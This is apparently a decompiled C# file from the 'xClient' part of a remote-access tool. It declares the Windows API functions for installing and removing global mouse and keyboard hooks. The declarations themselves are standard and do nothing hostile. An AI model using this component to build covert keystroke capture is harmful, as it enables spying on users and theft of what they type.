using System;
using System.Runtime.InteropServices;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x02000075 RID: 117
	internal static class HookNativeMethods
	{
		// Token: 0x0600031F RID: 799
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		internal static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000320 RID: 800
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		internal static extern HookProcedureHandle SetWindowsHookEx(int idHook, HookProcedure lpfn, IntPtr hMod, int dwThreadId);

		// Token: 0x06000321 RID: 801
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		internal static extern int UnhookWindowsHookEx(IntPtr idHook);
	}
}
